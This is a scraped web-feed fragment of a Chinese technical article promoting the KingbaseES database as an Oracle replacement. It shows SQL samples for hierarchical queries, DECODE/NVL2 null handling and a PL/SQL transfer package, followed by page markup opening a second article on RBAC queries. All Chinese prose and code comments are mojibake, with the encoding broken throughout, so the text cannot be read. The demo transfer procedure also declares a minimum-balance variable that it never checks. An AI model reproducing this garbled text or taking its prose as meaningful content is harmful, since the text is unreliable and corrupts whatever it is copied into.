<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> branch_offices <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">10101</span>, <span class="hljs-string">'æµ·æ·€æ”¯è¡Œ'</span>, <span class="hljs-number">101</span>);
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> branch_offices <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">10201</span>, <span class="hljs-string">'æµ¦ä¸œæ”¯è¡Œ'</span>, <span class="hljs-number">102</span>);
<span class="hljs-keyword">COMMIT</span>;

<span class="hljs-comment">-- 2. æ‰§è¡Œ Oracle å…¼å®¹çš„å±‚æ¬¡æŸ¥è¯¢</span>
<span class="hljs-keyword">SELECT</span> 
    org_id, 
    org_name, 
    PRIOR org_name <span class="hljs-keyword">AS</span> parent_name, 
    LEVEL
<span class="hljs-keyword">FROM</span> branch_offices
<span class="hljs-keyword">START</span> <span class="hljs-keyword">WITH</span> parent_org_id <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NULL</span>
<span class="hljs-keyword">CONNECT</span> <span class="hljs-keyword">BY</span> PRIOR org_id <span class="hljs-operator">=</span> parent_org_id
<span class="hljs-keyword">ORDER</span> SIBLINGS <span class="hljs-keyword">BY</span> org_name;
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/947b8f8a96334785ba1ede0960c4e9d4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766218326&amp;x-signature=FRdFuOilTXuZZq6E%2FAk%2FNxL%2BZBI%3D" alt="image.png" loading="lazy"/></p>
<blockquote>
<p><strong>ç‚¹è¯„</strong>ï¼šåœ¨ KingbaseES é‡Œï¼Œä¸Šé¢è¿™æ®µ SQL ç›´æ¥å°±èƒ½è·‘ï¼Œä¸éœ€è¦åšä»»ä½•è½¬æ¢ã€‚è¿™å¯¹äºé‚£äº›æœ‰ç€å¤æ‚å±‚çº§å…³ç³»çš„é‡‘èç³»ç»Ÿæ¥è¯´ï¼Œç®€ç›´æ˜¯æ•‘å‘½ç¨»è‰ï¼Œä»·å€¼åƒé‡‘ã€‚</p>
</blockquote>
<h3 data-id="heading-3">2. ä¸“æœ‰å‡½æ•°ä¸ç©ºå€¼å¤„ç†</h3>
<p><strong>ç—›ç‚¹</strong>ï¼šOracle é‡Œçš„ <code>DECODE</code>ã€<code>NVL2</code> ç®€ç›´æ˜¯æ— å¤„ä¸åœ¨ã€‚è€Œä¸” Oracle æœ‰ä¸ªæ€ªç™–ï¼Œå®ƒæŠŠ <code>''</code>ï¼ˆç©ºä¸²ï¼‰å½“æˆ <code>NULL</code>ï¼Œä½†æ ‡å‡† SQL é‡Œè¿™ä¿©å¯æ˜¯ä¸ä¸€æ ·çš„ã€‚å¦‚æœæ•°æ®åº“è¡Œä¸ºå¯¹ä¸ä¸Šï¼ŒæŸ¥å‡ºæ¥çš„ç»“æœé‚£å°±æ˜¯ä¸¤ç äº‹äº†ã€‚</p>
<p><strong>KingbaseES è¡¨ç°</strong>ï¼š<strong>å®Œç¾å¤åˆ»äº† Oracle çš„è¿™äº›è¡Œä¸ºã€‚</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 1. å‡†å¤‡æµ‹è¯•æ•°æ®</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> customers (
    cust_id <span class="hljs-type">INT</span> <span class="hljs-keyword">PRIMARY</span> KEY,
    status <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">10</span>), <span class="hljs-comment">-- æ¨èä½¿ç”¨ VARCHARï¼Œé¿å… CHAR(bpchar) å¯èƒ½å¯¼è‡´çš„å‡½æ•°å‚æ•°åŒ¹é…é—®é¢˜</span>
    risk_rating <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">10</span>),
    mobile_no <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">20</span>)
);

<span class="hljs-comment">-- æ’å…¥æ•°æ®ï¼šæ³¨æ„ç¬¬äºŒæ¡æ•°æ®çš„ mobile_no æ˜¯ç©ºä¸² ''</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> customers <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">1</span>, <span class="hljs-string">'1'</span>, <span class="hljs-string">'High'</span>, <span class="hljs-string">'13800138000'</span>);
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> customers <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">2</span>, <span class="hljs-string">'0'</span>, <span class="hljs-keyword">NULL</span>, <span class="hljs-string">''</span>); <span class="hljs-comment">-- Oracleæ¨¡å¼ä¸‹ '' è¢«å­˜ä¸º NULL</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> customers <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">3</span>, <span class="hljs-string">'9'</span>, <span class="hljs-string">'Low'</span>, <span class="hljs-string">'13900139000'</span>);
<span class="hljs-keyword">COMMIT</span>;

<span class="hljs-comment">-- 2. æ‰§è¡ŒæŸ¥è¯¢ï¼šéªŒè¯ DECODEã€NVL2 åŠç©ºä¸²=NULL çš„è¡Œä¸º</span>
<span class="hljs-comment">-- æ³¨æ„ï¼šè¯·ç¡®ä¿å½“å‰æ•°æ®åº“ä¸º Oracle å…¼å®¹æ¨¡å¼ (database_mode='ORACLE')</span>
<span class="hljs-keyword">SELECT</span> 
    cust_id,
    DECODE(status, <span class="hljs-string">'1'</span>, <span class="hljs-string">'æ­£å¸¸'</span>, <span class="hljs-string">'0'</span>, <span class="hljs-string">'å†»ç»“'</span>, <span class="hljs-string">'æœªçŸ¥'</span>) <span class="hljs-keyword">AS</span> status_desc,
    NVL2(risk_rating, <span class="hljs-string">'å·²è¯„çº§'</span>, <span class="hljs-string">'æœªè¯„çº§'</span>) <span class="hljs-keyword">AS</span> rating_flag
<span class="hljs-keyword">FROM</span> customers
<span class="hljs-keyword">WHERE</span> mobile_no <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NULL</span>;
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c5b0dad5294947888865a0847738d351~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766218326&amp;x-signature=Kbun6q5ZYuEHVKl8qaLsMDBQo%2FM%3D" alt="image.png" loading="lazy"/></p>
<blockquote>
<p><strong>ç‚¹è¯„</strong>ï¼šKingbaseES é€šè¿‡è°ƒæ•´å‚æ•°ï¼ˆæ¯”å¦‚ <code>ora_input_emptystr_isnull</code>ï¼‰ï¼Œèƒ½åœ¨å†…æ ¸å±‚é¢ç›´æ¥æ¨¡æ‹Ÿ Oracle çš„ç©ºå€¼å¤„ç†é€»è¾‘ï¼Œä¿è¯ä½ çš„ä¸šåŠ¡é€»è¾‘èƒ½å¤Ÿâ€œåŸæ±åŸå‘³â€åœ°è¿è¡Œã€‚</p>
</blockquote>
<h3 data-id="heading-4">3. PL/SQL é«˜çº§ç‰¹æ€§ï¼šåŒ…ä¸å¼‚å¸¸å¤„ç†</h3>
<p><strong>ç—›ç‚¹</strong>ï¼šæ ¸å¿ƒäº¤æ˜“ç³»ç»Ÿé‡Œï¼Œå¾€å¾€å°è£…äº†ä¸€å †åˆä¸€å †çš„ <code>PACKAGE</code>ï¼Œé‡Œé¢å…¨æ˜¯ç§æœ‰å˜é‡ã€é‡è½½å‡½æ•°å’Œè‡ªå®šä¹‰å¼‚å¸¸ï¼Œå¤æ‚å¾—å¾ˆã€‚</p>
<p><strong>KingbaseES è¡¨ç°</strong>ï¼šæ”¯æŒ PL/SQL å—ç»“æ„ã€<code>EXCEPTION</code> æ•è·ã€<code>PRAGMA</code> ç­‰é«˜çº§ç‰¹æ€§ï¼Œæ²¡åœ¨æ€•çš„ã€‚</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- æ–‡ä»¶å: pkg_test.sql</span>

<span class="hljs-comment">-- 1. å‡†å¤‡è¡¨å’Œæ•°æ®</span>
<span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> accounts;
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> accounts (
    id <span class="hljs-type">INT</span> <span class="hljs-keyword">PRIMARY</span> KEY,
    balance NUMBER(<span class="hljs-number">10</span>, <span class="hljs-number">2</span>)
);
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> accounts <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">101</span>, <span class="hljs-number">1000.00</span>);
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> accounts <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">102</span>, <span class="hljs-number">0.00</span>);
<span class="hljs-keyword">COMMIT</span>;

<span class="hljs-comment">-- 2. åˆ›å»ºåŒ…è§„èŒƒ (Package Specification)</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">OR</span> REPLACE PACKAGE pkg_trans_logic <span class="hljs-keyword">IS</span>
    <span class="hljs-keyword">PROCEDURE</span> transfer(p_from <span class="hljs-type">INT</span>, p_to <span class="hljs-type">INT</span>, p_amount NUMBER);
<span class="hljs-keyword">END</span> pkg_trans_logic;
<span class="hljs-operator">/</span>

<span class="hljs-comment">-- 3. åˆ›å»ºåŒ…ä½“ (Package Body)</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">OR</span> REPLACE PACKAGE BODY pkg_trans_logic <span class="hljs-keyword">IS</span>
    <span class="hljs-comment">-- ç§æœ‰å˜é‡</span>
    v_min_balance NUMBER :<span class="hljs-operator">=</span> <span class="hljs-number">100</span>;

    <span class="hljs-comment">-- å­˜å‚¨è¿‡ç¨‹å®ç°</span>
    <span class="hljs-keyword">PROCEDURE</span> transfer(p_from <span class="hljs-type">INT</span>, p_to <span class="hljs-type">INT</span>, p_amount NUMBER) <span class="hljs-keyword">IS</span>
    <span class="hljs-keyword">BEGIN</span>
        IF p_amount <span class="hljs-operator">&lt;</span> <span class="hljs-number">0</span> <span class="hljs-keyword">THEN</span>
            RAISE_APPLICATION_ERROR(<span class="hljs-number">-20001</span>, <span class="hljs-string">'è½¬è´¦é‡‘é¢ä¸èƒ½ä¸ºè´Ÿ'</span>);
        <span class="hljs-keyword">END</span> IF;
        
        <span class="hljs-comment">-- ç®€å•çš„è½¬è´¦é€»è¾‘</span>
        <span class="hljs-keyword">UPDATE</span> accounts <span class="hljs-keyword">SET</span> balance <span class="hljs-operator">=</span> balance <span class="hljs-operator">-</span> p_amount <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">=</span> p_from;
        <span class="hljs-keyword">UPDATE</span> accounts <span class="hljs-keyword">SET</span> balance <span class="hljs-operator">=</span> balance <span class="hljs-operator">+</span> p_amount <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">=</span> p_to;
        
        <span class="hljs-keyword">COMMIT</span>;
        DBMS_OUTPUT.PUT_LINE(<span class="hljs-string">'è½¬è´¦æˆåŠŸ'</span>);
    EXCEPTION
        <span class="hljs-keyword">WHEN</span> OTHERS <span class="hljs-keyword">THEN</span>
            <span class="hljs-keyword">ROLLBACK</span>;
            DBMS_OUTPUT.PUT_LINE(<span class="hljs-string">'äº¤æ˜“å¤±è´¥: '</span> <span class="hljs-operator">||</span> SQLERRM);
    <span class="hljs-keyword">END</span>;
<span class="hljs-keyword">END</span> pkg_trans_logic;
<span class="hljs-operator">/</span>

<span class="hljs-comment">-- 4. è°ƒç”¨æµ‹è¯•</span>
<span class="hljs-keyword">BEGIN</span>
    pkg_trans_logic.transfer(<span class="hljs-number">101</span>, <span class="hljs-number">102</span>, <span class="hljs-number">200</span>);
<span class="hljs-keyword">END</span>;
<span class="hljs-operator">/</span>

<span class="hljs-comment">-- 5. éªŒè¯ç»“æœ</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> accounts;
</code></pre>
<hr/>
<h2 data-id="heading-5">ä¸‰ã€ è¿ç§»ç”Ÿæ€ï¼šä»â€œèƒ½è¿â€åˆ°â€œå¥½è¿â€</h2>
<p>å…‰æ•°æ®åº“å…¼å®¹åšå¾—å¥½è¿˜ä¸å¤Ÿï¼ŒKingbaseES è¿˜å¤‡å¥½äº†ä¸€å¥—è¶æ‰‹çš„å®¶ä¼™äº‹å„¿ï¼Œå·ç§°â€œè¿ç§»ä¸‰å‰‘å®¢â€ï¼ŒæŠŠè¿ç§»é—¨æ§›é™å¾—é‚£æ˜¯ç›¸å½“ä½ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f0335ad83e9d4ee2af8178199fa88878~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766218326&amp;x-signature=cHippH7x65%2BEkzpyRYoarNB4dPY%3D" alt="image.png" loading="lazy"/></p>
<p><strong>KDMSï¼ˆè¯„å®šå·¥å…·ï¼‰</strong> åœ¨å¼€å·¥å‰ä¼šè‡ªåŠ¨æ‰«æOracleåº“ï¼Œå¹¶ç»™å‡ºä¸€ä»½â€œé€‚é…æ€§è¯„å®šæŠ¥å‘Šâ€ï¼Œè¯¥æŠ¥å‘Šå‡†ç¡®å‘ŠçŸ¥å“ªäº›ä»£ç éœ€ä¿®æ”¹ï¼ˆè­¬å¦‚æ˜¾ç¤º99%å¯è‡ªåŠ¨è½¬æ¢ï¼Œå¦æœ‰1%è¦äººå·¥è°ƒæ•´ï¼‰ã€‚</p>
<p><strong>KDTSï¼ˆè¿ç§»å·¥å…·ï¼‰</strong> å…·å¤‡é«˜é€Ÿæ¬è¿èƒ½åŠ›ï¼Œå®ƒæ”¯æŒå¤šçº¿ç¨‹å¹¶è¡Œè¿ç§»ï¼Œå¯¹äºå¤§è¡¨ä¼šè‡ªåŠ¨æ‰§è¡Œæ‹†åˆ†ï¼Œå…¶é€Ÿåº¦éå¸¸å¿«ã€‚ <strong>æ–­ç‚¹ç»­ä¼ </strong>ï¼šç½‘ç»œä¸ç¨³å®šä¹Ÿä¸æ€•ï¼Œä»»åŠ¡æ–­äº†èƒ½æ¥ç€ä¼ ï¼Œä¸ç”¨ä»å¤´æ¥ã€‚</p>
<p><strong>KFSï¼ˆåŒæ­¥å·¥å…·ï¼‰</strong> ä¾é æ—¥å¿—åˆ†æï¼ˆCDCï¼‰æŠ€æœ¯ï¼Œå¯ä»¥è¾¾æˆä»Oracleå‘KingbaseESçš„å³æ—¶å¢é‡åŒæ­¥ã€‚
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/99e3ffb052694792b7120572370529ee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766218326&amp;x-signature=w%2F2wUzPeoyqZELAKqThye%2FzeyAM%3D" alt="image.png" loading="lazy"/></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">*</span>   <span class="hljs-strong">**åº”ç”¨åœºæ™¯**</span>ï¼šåœ¨å‰²æ¥çš„çª—å£æœŸï¼Œèƒ½ä¿è¯æ–°è€åº“æ•°æ®æ˜¯ä¸€è‡´çš„ï¼Œæ”¯æŒâ€œå¹³æ»‘åˆ‡æ¢â€ï¼Œä¸‡ä¸€æœ‰å•¥é—®é¢˜è¿˜èƒ½â€œå›é€€â€ï¼Œç»™ä½ ç•™è¶³äº†åè·¯ã€‚
</code></pre>
<hr/>
<h2 data-id="heading-6">å››ã€ ç¹è£ç”Ÿæ€ï¼šä¸ä»…ä»…æ˜¯æ•°æ®åº“</h2>
<p>é€‰æ•°æ®åº“ï¼Œå…¶å®ä¹Ÿæ˜¯åœ¨é€‰ç”Ÿæ€ã€‚ç”µç§‘é‡‘ä»“ä½œä¸ºâ€œå›½äº§æ•°æ®åº“å››å°é¾™â€ä¹‹ä¸€ï¼Œåœ¨ç”Ÿæ€å»ºè®¾è¿™å—å„¿èµ°å¾—å¯æ˜¯ç›¸å½“é å‰ã€‚</p>
<h3 data-id="heading-7">1. å¼ºå¤§çš„ç¤¾åŒºæ”¯æŒ</h3>
<p>é‡åˆ°æŠ€æœ¯éš¾é¢˜ä¸çŸ¥é“å»å“ªé—®ï¼Ÿ</p>
<ul>
<li><strong>å®˜æ–¹çŸ¥è¯†åº“</strong>ï¼šè¿™é‡Œé¢æ¶µç›–äº†ä»å®‰è£…éƒ¨ç½²åˆ°å†…æ ¸è°ƒä¼˜çš„æµ·é‡å®æˆ˜æ¡ˆä¾‹ï¼Œç®€ç›´å°±æ˜¯ DBA çš„â€œé¿å‘æŒ‡å—â€ã€‚
<ul>
<li>ğŸ”— <strong>æ¨èæ”¶è—</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fbbs.kingbase.com.cn%2Fknowledge%2Fkes%2FKingbaseES%25E7%259F%25A5%25E8%25AF%2586%25E5%25BA%2593%2FKingbaseES%25E6%2595%25B0%25E6%258D%25AE%25E5%25BA%2593%25E7%259F%25A5%25E8%25AF%2586%25E5%259B%25BE%25E8%25B0%25B1" target="_blank" title="https://bbs.kingbase.com.cn/knowledge/kes/KingbaseES%E7%9F%A5%E8%AF%86%E5%BA%93/KingbaseES%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1" ref="nofollow noopener noreferrer">KingbaseES çŸ¥è¯†åº“</a></li>
</ul>
</li>
<li><strong>æŠ€æœ¯æ¢ç´¢åšå®¢</strong>ï¼šè¿™é‡Œæ±‡èšäº†ä¸€å¸®èµ„æ·±ä¸“å®¶çš„æ·±åº¦å¥½æ–‡ï¼Œä»å†…æ ¸åŸç†è§£æåˆ°è¡Œä¸šæœ€ä½³å®è·µï¼Œå†…å®¹é‚£æ˜¯ç›¸å½“æœ‰æ·±åº¦ã€‚
<ul>
<li>ğŸ”— <strong>å¿…è¯»å¹²è´§</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fkingbase.com.cn%2Fexplore" target="_blank" title="https://kingbase.com.cn/explore" ref="nofollow noopener noreferrer">é‡‘ä»“æŠ€æœ¯æ¢ç´¢</a></li>
</ul>
</li>
</ul>
<h3 data-id="heading-8">2. å®Œå¤‡çš„è®¤è¯ä½“ç³»</h3>
<p>ä¸ºäº†è§£å†³äººæ‰ä¸å¤Ÿç”¨çš„é—®é¢˜ï¼Œé‡‘ä»“æ¨å‡ºäº† <strong>KCA / KCP / KCM</strong> ä¸‰çº§è®¤è¯ä½“ç³»ï¼Œè¿˜åœ¨å…¨å›½çš„é«˜æ ¡å’ŒåŸ¹è®­æœºæ„é‡Œå¤§åŠ›æ¨å¹¿ã€‚å¯¹äºä¼ä¸šæ¥è¯´ï¼Œè¿™å°±æ„å‘³ç€æ‹›äººæ›´å®¹æ˜“äº†ï¼Œåç»­çš„è¿ç»´ä¹Ÿæœ‰äº†ä¿éšœã€‚</p>
<h3 data-id="heading-9">3. å…¨é¢çš„äº§å“å®¶æ—</h3>
<p>é’ˆå¯¹é‡‘èè¡Œä¸šå„ç§å„æ ·çš„éœ€æ±‚ï¼Œé‡‘ä»“å¯ä¸å…‰æœ‰ KingbaseESï¼Œè¿˜æœ‰ï¼š</p>
<ul>
<li><strong>KingbaseES RAC</strong>ï¼šå…±äº«å­˜å‚¨å¤šæ´»é›†ç¾¤ï¼Œç›´æ¥å¯¹æ ‡ Oracle RACï¼Œä¿ä½ æ ¸å¿ƒä¸šåŠ¡ 7x24 å°æ—¶éƒ½ä¸å¸¦åœæœºçš„ã€‚</li>
<li><strong>KStudio</strong>ï¼šå›¾å½¢åŒ–å¼€å‘å·¥å…·ï¼Œè®©ä¹ æƒ¯äº† PL/SQL Developer çš„å¼€å‘äººå‘˜èƒ½æ— ç¼åˆ‡æ¢ï¼Œä¸Šæ‰‹å°±èƒ½å¹²æ´»ã€‚
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6bc797718a28493fb79c16916a635fa6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766218326&amp;x-signature=zT0bmwz6HXU3v4Znvy3KY4Ca%2B4o%3D" alt="image.png" loading="lazy"/></li>
</ul>
<hr/>
<h2 data-id="heading-10">äº”ã€ ç»“è¯­</h2>
<p>åœ¨â€œä¿¡åˆ›â€è¿™åœºé‡å¤§è€ƒéªŒå½“ä¸­ï¼Œâ€œé‡‘ä»“ KingbaseESâ€å¯è¯´äº¤ä¸Šäº†ä¸€ä»½é«˜åˆ†è¯•å·ï¼Œå…¶å¹¶éä»…ä»…å……å½“å­˜å‚¨æ•°æ®çš„å®¹å™¨ï¼Œè€Œæ˜¯ä¸€æ•´å¥—åŒ…å«æœ‰â€œé«˜åº¦å¥‘åˆå†…æ ¸ + æ™ºèƒ½è¿ç§»å·¥å…· + å…¨é¢çŸ¥è¯†ç”Ÿæ€â€çš„å®Œå¤‡æ–¹æ¡ˆã€‚</p>
<p>å¯¹äºé‚£äº›è°‹æ±‚â€œç¨³ï¼Œå¿«ï¼Œå‡†â€è¿ç§»çš„é‡‘èå’Œå…³é”®è¡Œä¸šå®¢æˆ·è€Œè¨€ï¼ŒKingbaseES ç¡®å®ä½“ç°å‡ºè‡ªå·±æ˜¯å¯ä¿¡èµ–çš„â€œOracleå¹³æ›¿â€ï¼Œä¹Ÿæ˜¯æ”¹è‰¯å‡çº§çš„ä¸é”™ä¹‹é€‰ã€‚</p>
<blockquote>
<p><strong>æƒ³äº†è§£æ›´å¤šæŠ€æœ¯å¹²è´§ï¼Ÿ</strong>
æ¬¢è¿æ¥é‡‘ä»“æŠ€æœ¯ç¤¾åŒºé€›é€›ï¼Œå’Œæ•°ä¸‡åå¼€å‘è€…ä¸€èµ·èŠèŠå›½äº§æ•°æ®åº“çš„æœªæ¥ï¼
ğŸŒ <a href="https://link.juejin.cn?target=https%3A%2F%2Fkingbase.com.cn%2Fexplore" target="_blank" title="https://kingbase.com.cn/explore" ref="nofollow noopener noreferrer">kingbase.com.cn/explore</a></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[RBAC èœå•æŸ¥è¯¢çš„â€œæ ‡å‡†å†™æ³•â€]]></title>    <link>https://juejin.cn/post/7582814236583772198</link>    <guid>https://juejin.cn/post/7582814236583772198</guid>    <pubDate>2025-12-13T02:29:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582814236583772198" data-draft-id="7582846276506058790" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="RBAC èœå•æŸ¥è¯¢çš„â€œæ ‡å‡†å†™æ³•â€"/> <meta itemprop="keywords" content="MySQL"/> <meta itemprop="datePublished" content="2025-12-13T02:29:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¼ æ´ªæƒ"/> <meta itemprop="url" content="https://juejin.cn/user/1500154422651518"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            RBAC èœå•æŸ¥è¯¢çš„â€œæ ‡å‡†å†™æ³•â€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1500154422651518/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¼ æ´ªæƒ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-13T02:29:57.000Z" title="Sat Dec 13 2025 02:29:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag 